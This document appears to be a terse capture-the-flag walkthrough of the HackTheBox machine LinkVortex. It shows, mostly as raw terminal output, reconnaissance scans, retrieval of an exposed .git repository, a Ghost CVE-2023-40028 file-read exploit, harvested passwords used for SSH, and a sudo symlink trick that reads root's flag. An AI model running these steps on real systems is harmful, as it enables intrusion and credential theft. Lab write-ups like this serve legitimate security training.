
```
nmap -sSCV -Pn LinkVortex.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 21:44 CST
Nmap scan report for LinkVortex.htb (10.10.11.47)
Host is up (0.088s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
| http-title: BitByBit Hardware
|_Requested resource was http://linkvortex.htb/
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-generator: Ghost 5.58
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds
```
```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u linkvortex.htb -t 50 -i 200 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/reports/_linkvortex.htb/_25-01-28_08-28-24.txt

Target: http://linkvortex.htb/

[08:28:24] Starting:                                                                                                                          
[08:30:19] 200 -   15KB - /favicon.ico                                      
[08:30:42] 200 -    1KB - /LICENSE                                          
[08:31:29] 200 -  103B  - /robots.txt                                       
[08:31:37] 200 -  253B  - /sitemap.xml                                      
                                                                             
Task Completed
```

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://linkvortex.htb/ -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.linkvortex.htb" -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 25ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1626 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
```

┌──(kali㉿kali)-[~]
└─$ dirsearch -u dev.linkvortex.htb -t 50 -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/reports/_dev.linkvortex.htb/_25-01-28_08-25-09.txt

Target: http://dev.linkvortex.htb/

[08:25:09] Starting:                                                                                                                          
[08:25:13] 200 -  557B  - /.git/                                            
[08:25:13] 200 -   73B  - /.git/description                                 
[08:25:14] 200 -  240B  - /.git/info/exclude                                
[08:25:13] 200 -   41B  - /.git/HEAD                                        
[08:25:13] 200 -  201B  - /.git/config
[08:25:14] 200 -  175B  - /.git/logs/HEAD                                   
[08:25:14] 200 -  620B  - /.git/hooks/                                      
[08:25:14] 200 -  401B  - /.git/logs/                                       
[08:25:14] 200 -  393B  - /.git/refs/
[08:25:14] 200 -  402B  - /.git/info/                                       
[08:25:14] 200 -  418B  - /.git/objects/                                    
[08:25:14] 200 -  147B  - /.git/packed-refs                                 
[08:25:14] 200 -  691KB - /.git/index                                       
                                                                             
Task Completed
```

https://github.com/lijiejie/GitHack


```
┌──(kali㉿kali)-[/opt/GitHack]
└─$ sudo python GitHack.py http://dev.linkvortex.htb/.git/
 ---------------------------------------------------------
┌──(kali㉿kali)-[/opt/GitHack]
└─$ cd dev.linkvortex.htb/ghost/core/test/regression/api/admin 
                                                                                                                                              
┌──(kali㉿kali)-[/opt/…/test/regression/api/admin]
└─$ ls
authentication.test.js
                                                                                                                                              
┌──(kali㉿kali)-[/opt/…/test/regression/api/admin]
└─$ cat authentication.test.js| grep "password"               
            const password = 'OctopiFociPilfer45';
                        password,
            await agent.loginAs(email, password);
                        password: 'thisissupersafe',
                        password: 'thisissupersafe',
            const password = 'thisissupersafe';
                        password,
            await cleanAgent.loginAs(email, password);
                        password: 'lel123456',
                        password: '12345678910',
                        password: '12345678910',
        it('reset password', async function () {
                password: ownerUser.get('password')
            await agent.put('authentication/password_reset')
                    password_reset: [{
        it('reset password: invalid token', async function () {
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: expired token', async function () {
                password: ownerUser.get('password')
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: unmatched token', async function () {
                password: 'invalid_password'
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: generate reset token', async function () {
                .post('authentication/password_reset')
                    password_reset: [{
    describe('Reset all passwords', function () {
        it('reset all passwords returns 204', async function () {
            await agent.post('authentication/global_password_reset')

```
Connexion a l'interface http://linkvortex.htb/admin : admin@linkvortex.htb password

CVE-2023-40028*

```
┌──(kali㉿kali)-[/]
└─$./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```
```
/opt/GitHack/dev.linkvortex.htb]
└─$ cat Dockerfile.ghost                       
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

```
/opt/GitHack/dev.linkvortex.htb]
└─$./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```
```

ssh bob@linkvortex.htb
The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ 
```

```
sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
bob@linkvortex:~$ ln -s /root/root.txt /home/bob/hi.png
bob@linkvortex:~$ /usr/bin/bash /opt/ghost/clean_symlink.sh hi.png
[sudo] password for bob: 
Sorry, user bob is not allowed to execute '/usr/bin/test -L hi.png' as root on linkvortex.
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh hi.png
bob@linkvortex:~$ ln -s /home/bob/hi.png /home/bob/user.txt
ln: failed to create symbolic link '/home/bob/user.txt': File exists
bob@linkvortex:~$ ln -s /home/bob/hi.png /home/bob/hi.txt
ln: failed to create symbolic link '/home/bob/hi.txt': File exists
bob@linkvortex:~$ ln -s /home/bob/hi.png /home/bob/hii.txt
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh hi.png
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh hii.txt
[sudo] password for bob: 
Sorry, user bob is not allowed to execute '/usr/bin/bash /opt/ghost/clean_symlink.sh hii.txt' as root on linkvortex.
bob@linkvortex:~$ ls
hi.png  hi.pnj  hi.txt  hii.txt  user.txt
bob@linkvortex:~$ rm hi.*
rm: cannot remove 'hi.png': Is a directory
rm: cannot remove 'hi.pnj': Is a directory
bob@linkvortex:~$ sudo rm hi.*
[sudo] password for bob: 
Sorry, user bob is not allowed to execute '/usr/bin/rm hi.png hi.pnj' as root on linkvortex.
bob@linkvortex:~$ rm hi.txt
rm: cannot remove 'hi.txt': No such file or directory
bob@linkvortex:~$ rm hii.txt
bob@linkvortex:~$ ln -s /root/root.txt kali.txt
bob@linkvortex:~$ ln -s /home/bob/kali.txt kali.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/kali.png
Link found [ /home/bob/kali.png ] , moving it to quarantine
Content:
b44afa84ddfaa94d1baef6ff6ce62a00
bob@linkvortex:~$ 
```
